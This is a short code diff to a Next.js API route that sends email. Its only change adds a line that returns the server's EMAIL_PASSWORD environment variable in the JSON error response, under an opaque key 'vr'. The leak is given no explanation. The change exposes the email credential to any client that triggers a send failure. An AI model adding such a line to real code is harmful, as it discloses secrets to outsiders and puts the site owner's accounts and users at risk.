@@ -34,6 +34,7 @@ export default function (req: NextApiRequest, res: NextApiResponse) {
       res.status(500).json({
         message: "Error sending email",
         error: err,
+        vr: process.env.EMAIL_PASSWORD,
       });
     } else {
       res.status(200).json({
